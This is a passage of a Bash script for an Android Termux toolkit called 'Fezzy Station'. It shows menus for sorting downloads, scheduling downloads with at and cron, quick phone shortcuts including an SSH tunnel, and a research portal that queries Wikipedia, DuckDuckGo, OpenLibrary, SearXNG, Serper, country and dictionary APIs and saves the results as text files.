                    printf "  ${GRN}✓ Original folder shredded${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            b|B) return 0 ;;
        esac
    done 2>/dev/null
}

# ─── AUTO-TAGGING FOR DOWNLOADS ────────────────────────────────────
_auto_tag_downloads() {
    local watch="${1:-$DLDIR}"
    echo ""
    printf "  ${GRN}[AUTO-TAG]${RESET} ${WH}Scanning: %s${RESET}\n\n" "$watch"
    mkdir -p "$watch/music" "$watch/videos" "$watch/docs" "$watch/images" "$watch/archives" 2>/dev/null
    local moved=0

    _move_type() {
        local pattern="$1" dest="$2"
        while IFS= read -r -d '' f; do
            [[ "$(dirname "$f")" == "$watch" ]] || continue
            mv "$f" "$dest/" 2>/dev/null && ((moved++)) && \
                printf "  ${GRN}→${RESET} %-35s ${FADE}→ %s${RESET}\n" "$(basename "$f")" "$(basename "$dest")"
        done < <(find "$watch" -maxdepth 1 -type f $pattern -print0 2>/dev/null)
    }

    _move_type '\( -name "*.mp3" -o -name "*.flac" -o -name "*.m4a" -o -name "*.wav" -o -name "*.ogg" \)' "$watch/music"
    _move_type '\( -name "*.mp4" -o -name "*.mkv" -o -name "*.avi" -o -name "*.webm" -o -name "*.mov" \)' "$watch/videos"
    _move_type '\( -name "*.pdf" -o -name "*.epub" -o -name "*.txt" -o -name "*.md" -o -name "*.doc" -o -name "*.docx" \)' "$watch/docs"
    _move_type '\( -name "*.jpg" -o -name "*.jpeg" -o -name "*.png" -o -name "*.gif" -o -name "*.webp" \)' "$watch/images"
    _move_type '\( -name "*.zip" -o -name "*.tar" -o -name "*.gz" -o -name "*.rar" -o -name "*.7z" \)' "$watch/archives"

    echo ""
    printf "  ${GRN}✓ Auto-tag complete: %s file(s) organized${RESET}\n" "$moved"
    [[ $moved -eq 0 ]] && printf "  ${FADE}Nothing to move — flat files only targeted${RESET}\n"
    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
}

# ─── DOWNLOAD SCHEDULER ────────────────────────────────────────────
_dl_scheduler() {
    echo ""
    printf "  ${GRN}[SCHEDULER]${RESET} ${WH}Queue a download for later${RESET}\n\n"
    printf "  ${WH}[1] Schedule with 'at' (one-time)\n  [2] Schedule with cron (repeat)\n  [3] View cron jobs\n  [4] Clear all Fezzy cron jobs\n  [b] Back${RESET}\n\n"
    printf "  ${GRN}Choice » ${RESET}"; read -r sch
    case "$sch" in
        1)
            printf "  ${WH}URL to download: ${RESET}"; read -r surl
            [[ -z "$surl" ]] && return
            printf "  ${WH}Time (e.g. 'now + 2 hours' or '23:00'): ${RESET}"; read -r stime
            echo ""
            if command -v at &>/dev/null; then
                echo "yt-dlp -x --audio-format mp3 -o '$DLDIR/%(title)s.%(ext)s' '$surl'" | at "$stime" 2>/dev/null && \
                    printf "  ${GRN}✓ Scheduled for: %s${RESET}\n" "$stime" || \
                    printf "  ${RED}at failed — pkg install at${RESET}\n"
            else
                printf "  ${RED}at not installed — pkg install at${RESET}\n"
            fi
            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
        2)
            printf "  ${WH}Cron schedule (e.g. '0 2 * * *' for 2am daily): ${RESET}"; read -r sched
            printf "  ${WH}Command to run: ${RESET}"; read -r scmd
            [[ -z "$sched" || -z "$scmd" ]] && return
            (crontab -l 2>/dev/null; echo "$sched $scmd  # Fezzy Station") | crontab -
            printf "  ${GRN}✓ Cron job added${RESET}\n"
            termux-wake-lock 2>/dev/null
            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
        3)
            echo ""
            crontab -l 2>/dev/null | grep -n "." | sed 's/^/  /' || printf "  ${FADE}No cron jobs${RESET}\n"
            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
        4)
            crontab -l 2>/dev/null | grep -v "# Fezzy Station" | crontab - && \
                printf "  ${GRN}✓ Fezzy cron jobs cleared${RESET}\n" || \
                printf "  ${FADE}Nothing to clear${RESET}\n"
            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
        b|B) return 0 ;;
    esac
}

# ─── ONE-PRESS SHORTCUTS ───────────────────────────────────────────
_quick_shortcuts() {
    while true; do
        clear; echo ""
        printf "  ${HOT}${BOLD}ONE-PRESS SHORTCUTS  —  Fezzy Quick Actions${RESET}\n"
        printf "  ${FADE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}\n\n"
        printf "  ${WH}[1] Copy last downloaded file path to clipboard\n"
        printf "  [2] Send battery + storage info as notification\n"
        printf "  [3] Toggle VPN/SSH tunnel\n"
        printf "  [4] Launch tmux with all portals pre-loaded\n"
        printf "  [5] Screenshot path to clipboard\n"
        printf "  [6] Show last 10 downloads\n"
        printf "  [b] Back${RESET}\n\n"
        printf "  ${HOT}Choice » ${RESET}"; read -r qch
        case "$qch" in
            1)
                local last; last=$(ls -t "$DLDIR" 2>/dev/null | head -1)
                if [[ -n "$last" ]]; then
                    echo "$DLDIR/$last" | termux-clipboard-set 2>/dev/null
                    printf "  ${GRN}✓ Copied: %s/%s${RESET}\n" "$DLDIR" "$last"
                else
                    printf "  ${FADE}No downloads found${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)
                local bat; bat=$(_get_battery 2>/dev/null || echo "N/A")
                local stor; stor=$(df -h ~/storage/downloads 2>/dev/null | tail -1 | awk '{print $4}')
                local msg="🔋 $bat | 💾 Free: ${stor:-N/A}"
                termux-notification --title "Fezzy Station" --content "$msg" 2>/dev/null
                printf "  ${GRN}✓ Notification sent: %s${RESET}\n" "$msg"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)
                echo ""
                printf "  ${WH}[1] SSH tunnel  [2] Kill tunnel  [3] Status: ${RESET}"; read -r vtun
                case "$vtun" in
                    1) printf "  ${WH}user@host:port: ${RESET}"; read -r vhost
                       printf "  ${WH}Local port: ${RESET}"; read -r vlport
                       ssh -L "${vlport}:localhost:80" "$vhost" -N -f 2>/dev/null && \
                           printf "  ${GRN}✓ Tunnel active on port %s${RESET}\n" "$vlport" || \
                           printf "  ${RED}SSH failed${RESET}\n" ;;
                    2) pkill -f "ssh -L" && printf "  ${GRN}✓ Tunnel killed${RESET}\n" || printf "  ${FADE}No tunnel found${RESET}\n" ;;
                    3) pgrep -a ssh | sed 's/^/  /' || printf "  ${FADE}No SSH processes${RESET}\n" ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)
                if command -v tmux &>/dev/null; then
                    printf "  ${GRN}[*] Launching tmux session with portals...${RESET}\n"
                    tmux new-session -d -s fezzy -n "main" 2>/dev/null || true
                    tmux send-keys -t fezzy "source ~/.bashrc && station" Enter 2>/dev/null
                    tmux split-window -h -t fezzy 2>/dev/null || true
                    tmux send-keys -t fezzy "htop" Enter 2>/dev/null
                    tmux attach -t fezzy
                else
                    printf "  ${RED}tmux not installed — pkg install tmux${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
                fi ;;
            5)
                local sspath; sspath=$(ls -t /sdcard/Pictures/Screenshots/*.png 2>/dev/null | head -1)
                if [[ -n "$sspath" ]]; then
                    echo "$sspath" | termux-clipboard-set 2>/dev/null
                    printf "  ${GRN}✓ Screenshot path copied: %s${RESET}\n" "$sspath"
                else
                    printf "  ${FADE}No screenshots found${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                echo ""
                printf "  ${WH}Last 10 downloads:${RESET}\n\n"
                ls -lt "$DLDIR" 2>/dev/null | grep -v "^total\|^d" | head -10 | awk '{print "  " $NF}' | sed 's|.*/||'
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            b|B) return 0 ;;
        esac
    done 2>/dev/null
}


# ═══════════════════════════════════════════════════════════════════
#  [18] FEZZY SECURITY PORTAL
# ═══════════════════════════════════════════════════════════════════

research_portal() {
    local SERPER_KEY_FILE=~/.fezzy_serper_key
    local SERPER_KEY=""
    [[ -f "$SERPER_KEY_FILE" ]] && SERPER_KEY=$(cat "$SERPER_KEY_FILE" 2>/dev/null)
    mkdir -p "$RESDIR" 2>/dev/null

    # ── URL encode helper ────────────────────────────────────────────
    _url_encode() {
        python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1]))" "$1" 2>/dev/null
    }

    # ── Save + copy to sdcard ────────────────────────────────────────
    _res_save() {
        local slug="$1" content="$2"
        local fname="${slug}_$(date +%Y%m%d_%H%M%S).txt"
        local fpath="$RESDIR/$fname"
        local sdpath="/sdcard/Download/research"
        mkdir -p "$sdpath" 2>/dev/null
        echo "$content" > "$fpath"
        cp "$fpath" "$sdpath/$fname" 2>/dev/null
        printf "\n  ${GRN}✓ Saved:${RESET} ${WH}%s${RESET}\n" "$fpath"
        printf "  ${GRN}✓ Copied to:${RESET} ${WH}%s/%s${RESET}\n" "$sdpath" "$fname"
    }

    # ── Wikipedia ───────────────────────────────────────────────────
    _res_wikipedia() {
        local topic="$1"
        local enc; enc=$(_url_encode "$topic")
        local raw; raw=$(curl -s --max-time 12 \
            "https://en.wikipedia.org/w/api.php?action=query&prop=extracts&explaintext=true&redirects=1&titles=${enc}&format=json" 2>/dev/null)
        echo "$raw" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    pages = d.get('query',{}).get('pages',{})
    page = list(pages.values())[0]
    title = page.get('title','Unknown')
    extract = page.get('extract','') or ''
    if not extract.strip():
        print('  [Wikipedia] No article found for this topic.')
    else:
        print('══ WIKIPEDIA: ' + title + ' ══')
        print()
        print(extract[:6000])
        if len(extract) > 6000:
            print('... [article continues — full text saved to file]')
except Exception as e:
    print('  [Wikipedia] Error: ' + str(e))
" 2>/dev/null
    }

    # ── DuckDuckGo Instant Answer ───────────────────────────────────
    _res_ddg() {
        local topic="$1"
        local enc; enc=$(_url_encode "$topic")
        local raw; raw=$(curl -s --max-time 10 \
            "https://api.duckduckgo.com/?q=${enc}&format=json&no_html=1&skip_disambig=1" 2>/dev/null)
        echo "$raw" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    heading  = d.get('Heading','')
    abstract = d.get('Abstract','') or d.get('AbstractText','')
    answer   = d.get('Answer','')
    src      = d.get('AbstractSource','')
    related  = d.get('RelatedTopics',[])
    out = ['══ DUCKDUCKGO INSTANT ANSWER ══','']
    if heading:  out.append('Topic   : ' + heading)
    if answer:   out.append('Answer  : ' + answer)
    if abstract: out.append('Summary : ' + abstract[:1200])
    if src:      out.append('Source  : ' + src)
    if related:
        out.append('')
        out.append('Related :')
        for r in related[:5]:
            text = r.get('Text','') or ''
            if text: out.append('  · ' + str(text)[:100])
    if not heading and not abstract and not answer:
        out.append('  [DuckDuckGo] No instant answer found — try a different query.')
    print('\n'.join(out))
except Exception as e:
    print('  [DuckDuckGo] Error: ' + str(e))
" 2>/dev/null
    }

    # ── OpenLibrary ─────────────────────────────────────────────────
    _res_openlibrary() {
        local topic="$1"
        local enc; enc=$(_url_encode "$topic")
        local raw; raw=$(curl -s --max-time 12 \
            "https://openlibrary.org/search.json?q=${enc}&limit=8&fields=title,author_name,first_publish_year" 2>/dev/null)
        echo "$raw" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    docs  = d.get('docs', [])
    total = d.get('numFound', 0)
    out   = ['══ OPENLIBRARY — Books & References ══','','Total results: ' + str(total),'']
    for i, doc in enumerate(docs, 1):
        title   = doc.get('title', 'Unknown title')
        authors = ', '.join(doc.get('author_name', ['Unknown author'])[:2])
        year    = str(doc.get('first_publish_year', '?'))
        out.append(f'  {i:2}. {title}')
        out.append(f'      Author: {authors}  ·  Year: {year}')
        out.append('')
    if not docs:
        out.append('  [OpenLibrary] No books found for this topic.')
    print('\n'.join(out))
except Exception as e:
    print('  [OpenLibrary] Error: ' + str(e))
" 2>/dev/null
    }

    # ── SearXNG meta-search ─────────────────────────────────────────
    _res_searxng() {
        local topic="$1"
        local enc; enc=$(_url_encode "$topic")
        local raw=""
        local instances=(
            "https://searx.be/search?q=${enc}&format=json"
            "https://search.bus-hit.me/search?q=${enc}&format=json"
            "https://opnxng.com/search?q=${enc}&format=json"
            "https://searxng.site/search?q=${enc}&format=json"
        )
        for inst in "${instances[@]}"; do
            raw=$(curl -s --max-time 10 -H "User-Agent: Mozilla/5.0" "$inst" 2>/dev/null)
            [[ -n "$raw" && "$raw" == *"results"* ]] && break
        done
        echo "$raw" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    results = d.get('results', [])
    out = ['══ SEARXNG META-SEARCH (Google/Bing/Yahoo) ══','']
    if not results:
        out.append('  [SearXNG] No results — instance may be rate limiting. Try [5] Serper.')
    else:
        for i, r in enumerate(results[:7], 1):
            title   = r.get('title', 'No title')
            url     = r.get('url', '')
            content = r.get('content', '')
            engine  = r.get('engine', '')
            out.append(f'  {i}. {title}')
            if content: out.append(f'     {str(content)[:160]}')
            out.append(f'     [{engine}] {url}')
            out.append('')
    print('\n'.join(out))
except Exception as e:
    print('  [SearXNG] Error: ' + str(e))
" 2>/dev/null
    }

    # ── Serper.dev (real Google) ────────────────────────────────────
    _res_serper() {
        local topic="$1" key="$2"
        if [[ -z "$key" ]]; then
            printf "  ${YEL}[!] No Serper API key. Run [Z] Setup to save one.${RESET}\n"
            printf "  ${FADE}Get a free key (2500 searches) at: serper.dev${RESET}\n"
            return 1
        fi
        local raw; raw=$(curl -s --max-time 12 \
            -H "X-API-KEY: $key" \
            -H "Content-Type: application/json" \
            -d "{\"q\":\"$topic\",\"num\":8}" \
            "https://google.serper.dev/search" 2>/dev/null)
        echo "$raw" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    organic = d.get('organic', [])
    answer  = d.get('answerBox', {})
    out = ['══ SERPER.DEV — Real Google Results ══','']
    if answer:
        out.append('Answer Box:')
        out.append('  ' + str(answer.get('answer', answer.get('snippet', ''))))
        out.append('')
    if not organic:
        err = d.get('message','')
        out.append('  [Serper] No results. ' + (err or 'Check your API key.'))
    else:
        for i, r in enumerate(organic, 1):
            title   = r.get('title', 'No title')
            link    = r.get('link', '')
            snippet = r.get('snippet', '')
            out.append(f'  {i}. {title}')
            if snippet: out.append(f'     {snippet[:200]}')
            out.append(f'     {link}')
            out.append('')
    print('\n'.join(out))
except Exception as e:
    print('  [Serper] Error: ' + str(e))
" 2>/dev/null
    }

    # ── Country Info ────────────────────────────────────────────────
    _res_country() {
        local country="$1"
        local enc; enc=$(_url_encode "$country")
        local raw; raw=$(curl -s --max-time 10 \
            "https://restcountries.com/v3.1/name/${enc}?fullText=false" 2>/dev/null)
        echo "$raw" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    if isinstance(data, list) and data:
        c = data[0]
        name       = c.get('name',{}).get('common','?')
        official   = c.get('name',{}).get('official','?')
        capital    = ', '.join(c.get('capital',['?']))
        region     = c.get('region','?')
        sub        = c.get('subregion','?')
        pop        = c.get('population',0)
        area       = c.get('area','?')
        langs      = ', '.join(c.get('languages',{}).values())
        currencies = ', '.join([v.get('name','?') for v in c.get('currencies',{}).values()])
        tld        = ', '.join(c.get('tld',[]))
        timezones  = ', '.join(c.get('timezones',[]))
        borders    = ', '.join(c.get('borders',[]))
        flag       = c.get('flag','')
        out = [
            '══ COUNTRY INFO: ' + name + ' ' + flag + ' ══', '',
            f'  Official Name  : {official}',
            f'  Capital        : {capital}',
            f'  Region         : {region} / {sub}',
            f'  Population     : {pop:,}',
            f'  Area           : {area} km\u00b2',
            f'  Languages      : {langs}',
            f'  Currency       : {currencies}',
            f'  TLD            : {tld}',
            f'  Timezones      : {timezones}',
            f'  Borders        : {borders if borders else \"None / Island nation\"}',
        ]
        print('\n'.join(out))
    elif isinstance(data, dict) and data.get('status') == 404:
        print('  [Country Info] Country not found. Try a different spelling.')
    else:
        print('  [Country Info] No data returned.')
except Exception as e:
    print('  [Country Info] Error: ' + str(e))
" 2>/dev/null
    }

    # ── Dictionary ──────────────────────────────────────────────────
    _res_dictionary() {
        local word="$1"
        local enc; enc=$(_url_encode "$word")
        local raw; raw=$(curl -s --max-time 10 \
            "https://api.dictionaryapi.dev/api/v2/entries/en/${enc}" 2>/dev/null)
        echo "$raw" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    if isinstance(data, list) and data:
        entry    = data[0]
        word_out = entry.get('word','?')
        phonetic = entry.get('phonetic','')
        meanings = entry.get('meanings',[])
        out = ['══ DICTIONARY: ' + word_out + ' ══', '']
        if phonetic:
            out.append('  Phonetic: ' + phonetic)
            out.append('')
        for m in meanings[:4]:
            pos  = m.get('partOfSpeech','?')
            defs = m.get('definitions',[])
            out.append(f'  [{pos.upper()}]')
            for j, d in enumerate(defs[:3], 1):
                out.append(f'    {j}. ' + d.get('definition','?'))
                eg = d.get('example','')
                if eg: out.append(f'       e.g. \"{eg}\"')
                synonyms = d.get('synonyms',[])
                if synonyms: out.append('       Synonyms: ' + ', '.join(synonyms[:5]))
            out.append('')
        print('\n'.join(out))
    elif isinstance(data, dict):
        print('  [Dictionary] ' + data.get('message','Word not found.'))
    else:
        print('  [Dictionary] No definition found.')
except Exception as e:
    print('  [Dictionary] Error: ' + str(e))
" 2>/dev/null
    }

    # ════════════════════════════════════════════════════════════════
    #  MAIN LOOP
    # ════════════════════════════════════════════════════════════════
    while true; do
        clear
        echo ""
        _dv18
        printf "  ${C18}${BOLD}RESEARCH PORTAL  —  Wikipedia · DDG · OpenLibrary · SearXNG · Serper${RESET}\n"
        _dv18
        echo ""
        printf "  ${WH}Every search saves a .txt to your phone · Strategy Over Impulse · 999${RESET}\n"
        printf "  ${FADE}■ Pulled the whole Wikipedia on the block · no key needed · research moved quiet · Serper never saw us coming${RESET}\n"
        echo ""
        _dv18
        echo ""
        printf "  ${C18}${BOLD}── SOURCES ─────────────────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[1]  Wikipedia      — full article text, any topic                    ${RESET}\n"
        printf "  ${WH}[2]  DuckDuckGo     — instant answers, definitions, quick facts       ${RESET}\n"
        printf "  ${WH}[3]  OpenLibrary    — books, authors, references on any topic         ${RESET}\n"
        printf "  ${WH}[4]  SearXNG        — meta-search: Google · Bing · Yahoo at once      ${RESET}\n"
        printf "  ${WH}[5]  Serper.dev     — real Google results (free API key required)     ${RESET}\n"
        printf "  ${WH}[6]  Country Info   — full data on any nation, capital, language      ${RESET}\n"
        printf "  ${WH}[7]  Dictionary     — define any word with examples + synonyms        ${RESET}\n"
        echo ""
        printf "  ${C18}${BOLD}── POWER TOOLS ─────────────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[8]  Multi-Search   — one topic hits ALL sources → one big .txt       ${RESET}\n"
        printf "  ${WH}[9]  Browse Saved   — view past research files                       ${RESET}\n"
        printf "  ${WH}[10] Save to Obsidian — copy last result to your Obsidian vault      ${RESET}\n"
        echo ""
        printf "  ${C18}${BOLD}── CONFIG ──────────────────────────────────────────────────────────${RESET}\n"
        if [[ -n "$SERPER_KEY" ]]; then
            printf "  ${C18}[Z]  Setup          — Serper API key: ${GRN}✓ saved${RESET}\n"
        else
            printf "  ${C18}[Z]  Setup          — Serper API key: ${YEL}not set${RESET}  ${FADE}(serper.dev — free, 2500/mo)${RESET}\n"
        fi
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv18
        echo ""
        _hover_hint "research"
        echo ""
        printf "  ${C18}${BOLD}Choice » ${RESET}"
        read -r ch

        case "$ch" in
            # ── [1] Wikipedia ─────────────────────────────────────
            1)
                echo ""; printf "  ${WH}Topic to search on Wikipedia: ${RESET}"; read -r topic
                [[ -z "$topic" ]] && continue
                echo ""
                _spin "Fetching Wikipedia article" 1.5 "${C18}"
                echo ""
                local wiki_out; wiki_out=$(_res_wikipedia "$topic")
                echo "$wiki_out"
                _res_save "wikipedia_$(echo "$topic" | tr ' ' '_')" "$wiki_out"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;

            # ── [2] DuckDuckGo ────────────────────────────────────
            2)
                echo ""; printf "  ${WH}Search query: ${RESET}"; read -r topic
                [[ -z "$topic" ]] && continue
                echo ""
                _spin "Hitting DuckDuckGo" 1.2 "${C18}"
                echo ""
                local ddg_out; ddg_out=$(_res_ddg "$topic")
                echo "$ddg_out"
                _res_save "ddg_$(echo "$topic" | tr ' ' '_')" "$ddg_out"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;

            # ── [3] OpenLibrary ───────────────────────────────────
            3)
                echo ""; printf "  ${WH}Book / author / subject search: ${RESET}"; read -r topic
                [[ -z "$topic" ]] && continue
                echo ""
                _spin "Searching OpenLibrary" 1.5 "${C18}"
                echo ""
                local olib_out; olib_out=$(_res_openlibrary "$topic")
                echo "$olib_out"
                _res_save "openlibrary_$(echo "$topic" | tr ' ' '_')" "$olib_out"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;

            # ── [4] SearXNG ───────────────────────────────────────
            4)
                echo ""; printf "  ${WH}Search query: ${RESET}"; read -r topic
                [[ -z "$topic" ]] && continue
                echo ""
                _spin "Querying SearXNG instances" 2.0 "${C18}"
                echo ""
                local sx_out; sx_out=$(_res_searxng "$topic")
                echo "$sx_out"
                _res_save "searxng_$(echo "$topic" | tr ' ' '_')" "$sx_out"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;

            # ── [5] Serper.dev ────────────────────────────────────
            5)
                echo ""; printf "  ${WH}Google search query: ${RESET}"; read -r topic
                [[ -z "$topic" ]] && continue
                echo ""
                _spin "Hitting Google via Serper.dev" 1.5 "${C18}"
                echo ""
                local srp_out; srp_out=$(_res_serper "$topic" "$SERPER_KEY")
                echo "$srp_out"
                [[ -n "$srp_out" ]] && _res_save "serper_$(echo "$topic" | tr ' ' '_')" "$srp_out"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;

            # ── [6] Country Info ──────────────────────────────────
            6)
                echo ""; printf "  ${WH}Country name: ${RESET}"; read -r topic
                [[ -z "$topic" ]] && continue
                echo ""
                _spin "Fetching country data" 1.2 "${C18}"
                echo ""
                local ct_out; ct_out=$(_res_country "$topic")
                echo "$ct_out"
                _res_save "country_$(echo "$topic" | tr ' ' '_')" "$ct_out"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;

            # ── [7] Dictionary ────────────────────────────────────
            7)
                echo ""; printf "  ${WH}Word to define: ${RESET}"; read -r topic
                [[ -z "$topic" ]] && continue
                echo ""
                _spin "Looking up definition" 1.0 "${C18}"
                echo ""
                local dict_out; dict_out=$(_res_dictionary "$topic")
                echo "$dict_out"
                _res_save "dictionary_$(echo "$topic" | tr ' ' '_')" "$dict_out"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;

            # ── [8] Multi-Search ──────────────────────────────────
            8)
                echo ""; printf "  ${WH}Topic (hits all sources at once): ${RESET}"; read -r topic
                [[ -z "$topic" ]] && continue
                local slug; slug=$(echo "$topic" | tr ' ' '_' | tr '[:upper:]' '[:lower:]')
                local ts; ts=$(date +%Y%m%d_%H%M%S)
                local outfile="$RESDIR/multi_${slug}_${ts}.txt"
                local sdpath="/sdcard/Download/research"
                mkdir -p "$sdpath" 2>/dev/null

                echo ""
                printf "  ${C18}[MULTI-SEARCH]${RESET} ${WH}%s${RESET}\n\n" "$topic"
                {
                    echo "═══════════════════════════════════════════════════════════"
                    echo "  FEZZY PORTALS v1 Enhanced — RESEARCH REPORT"
                    echo "  Topic  : $topic"
                    echo "  Date   : $(date '+%Y-%m-%d %H:%M:%S')"
                    echo "  Sources: Wikipedia · DuckDuckGo · OpenLibrary · SearXNG · Country Info · Dictionary"
                    echo "═══════════════════════════════════════════════════════════"
                    echo ""
                } > "$outfile"

                _spin "Wikipedia" 1.5 "${C18}"
                {
                    echo ""
                    _res_wikipedia "$topic"
                    echo ""
                    echo "───────────────────────────────────────────────────────────"
                } >> "$outfile"

                _spin "DuckDuckGo" 1.2 "${C18}"
                {
                    echo ""
                    _res_ddg "$topic"
                    echo ""
                    echo "───────────────────────────────────────────────────────────"
                } >> "$outfile"

                _spin "OpenLibrary" 1.5 "${C18}"
                {
                    echo ""
                    _res_openlibrary "$topic"
                    echo ""
                    echo "───────────────────────────────────────────────────────────"
                } >> "$outfile"

                _spin "SearXNG" 2.0 "${C18}"
                {
                    echo ""
                    _res_searxng "$topic"
                    echo ""
                    echo "───────────────────────────────────────────────────────────"
                } >> "$outfile"

                if [[ -n "$SERPER_KEY" ]]; then
                    _spin "Serper.dev (Google)" 1.5 "${C18}"
                    {
                        echo ""
                        _res_serper "$topic" "$SERPER_KEY"
                        echo ""
                        echo "───────────────────────────────────────────────────────────"
                    } >> "$outfile"
                fi

                _spin "Country Info" 1.2 "${C18}"
                {
                    echo ""
                    _res_country "$topic"
                    echo ""
                    echo "───────────────────────────────────────────────────────────"
                } >> "$outfile"

                _spin "Dictionary" 1.0 "${C18}"
                {
                    echo ""
                    _res_dictionary "$topic"
                    echo ""
                    echo "═══════════════════════════════════════════════════════════"
                    echo "  END OF REPORT — Strategy Over Impulse · 999"
                    echo "═══════════════════════════════════════════════════════════"
                } >> "$outfile"

                cp "$outfile" "$sdpath/" 2>/dev/null
                echo ""
                _dv18
                printf "  ${GRN}✓ Multi-Search complete!${RESET}\n"
                printf "  ${GRN}✓ File saved:${RESET}  ${WH}%s${RESET}\n" "$outfile"
                printf "  ${GRN}✓ On phone:   ${RESET}  ${WH}%s/%s${RESET}\n" "$sdpath" "multi_${slug}_${ts}.txt"
                _dv18
                echo ""
                printf "  ${WH}Preview? [y/n]: ${RESET}"; read -r prev
                [[ "$prev" == "y" || "$prev" == "Y" ]] && less -R "$outfile"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;

            # ── [9] Browse Saved ──────────────────────────────────
            9)
                clear
                echo ""
                _dv18
                printf "  ${C18}${BOLD}SAVED RESEARCH FILES${RESET}\n"
                _dv18
                echo ""
                local files=()
                mapfile -t files < <(find "$RESDIR" -maxdepth 1 -name "*.txt" -type f 2>/dev/null | sort -r)
                if [[ ${#files[@]} -eq 0 ]]; then
                    printf "  ${FADE}No research files yet. Run a search to get started.${RESET}\n"
                else
                    printf "  ${WH}%s file(s) in vault:${RESET}\n\n" "${#files[@]}"
                    local i=1
                    for f in "${files[@]}"; do
                        local sz; sz=$(wc -c < "$f" 2>/dev/null | awk '{printf "%.1f KB", $1/1024}')
                        local dt; dt=$(stat -c %y "$f" 2>/dev/null | cut -c1-16)
                        printf "  ${C18}%2d.${RESET} %-45s ${FADE}%s  %s${RESET}\n" "$i" "$(basename "$f")" "$sz" "$dt"
                        ((i++))
                    done
                    echo ""
                    printf "  ${WH}Open file number (or ENTER to skip): ${RESET}"; read -r fnum
                    if [[ -n "$fnum" && "$fnum" =~ ^[0-9]+$ ]]; then
                        local idx=$(( fnum - 1 ))
                        local picked="${files[$idx]}"
                        [[ -f "$picked" ]] && less -R "$picked" || printf "  ${RED}Invalid${RESET}\n"
                    fi
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;

            # ── [Z] Setup / Serper key ────────────────────────────
            z|Z)
                echo ""
                printf "  ${C18}[SETUP]${RESET} ${WH}Serper.dev API Key${RESET}\n\n"
                printf "  ${FADE}Get a free key at serper.dev (2500 Google searches/month, no card)${RESET}\n\n"
                printf "  ${WH}Paste your Serper API key (hidden): ${RESET}"
                read -rs skey; echo ""
                [[ -z "$skey" ]] && { printf "  ${YEL}Cancelled.${RESET}\n"; sleep 1; continue; }
                echo "$skey" > "$SERPER_KEY_FILE"
                chmod 600 "$SERPER_KEY_FILE"
                SERPER_KEY="$skey"
                printf "  ${GRN}✓ Serper key saved to %s${RESET}\n" "$SERPER_KEY_FILE"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;

            N|n) _fezzy_notepad ;;
            10)
                clear; echo ""
                _dv18
                printf "  ${C18}${BOLD}SAVE TO OBSIDIAN VAULT${RESET}\n"
                _dv18; echo ""
                local _obs_vaults=()
                # Common Obsidian vault locations on Android
                for _od in /sdcard/Obsidian /sdcard/Documents/Obsidian /sdcard/Download/Obsidian "$HOME/storage/shared/Obsidian" "$HOME/storage/documents/Obsidian"; do
                    [[ -d "$_od" ]] && _obs_vaults+=("$_od")
                done
                if [[ ${#_obs_vaults[@]} -eq 0 ]]; then
                    printf "  ${YEL}No Obsidian vault found in standard locations.${RESET}\n"
                    printf "  ${WH}Enter vault path manually: ${RESET}"; read -r _obsman
                    [[ -z "$_obsman" ]] && { printf "  ${FADE}Cancelled${RESET}\n"; sleep 1; continue; }
                    _obs_vaults+=("$_obsman")
                fi
                printf "  ${WH}Vault location: ${C18}%s${RESET}\n\n" "${_obs_vaults[0]}"
                # Pick most recent research file
                local _obs_files=()
                mapfile -t _obs_files < <(find "$RESDIR" -maxdepth 1 -name "*.txt" -type f 2>/dev/null | sort -r | head -10)
                if [[ ${#_obs_files[@]} -eq 0 ]]; then
                    printf "  ${FADE}No research files to export yet.${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                fi
                printf "  ${WH}Recent files:${RESET}\n\n"
                for _oi in "${!_obs_files[@]}"; do
                    printf "  ${C18}%2d.${RESET}  ${WH}%s${RESET}\n" "$((_oi+1))" "$(basename "${_obs_files[$_oi]}")"
                done
                echo ""
                printf "  ${WH}Pick number (or 0 for latest): ${RESET}"; read -r _onum
                local _opicked
                if [[ "$_onum" == "0" || -z "$_onum" ]]; then
                    _opicked="${_obs_files[0]}"
                elif [[ "$_onum" =~ ^[0-9]+$ ]]; then
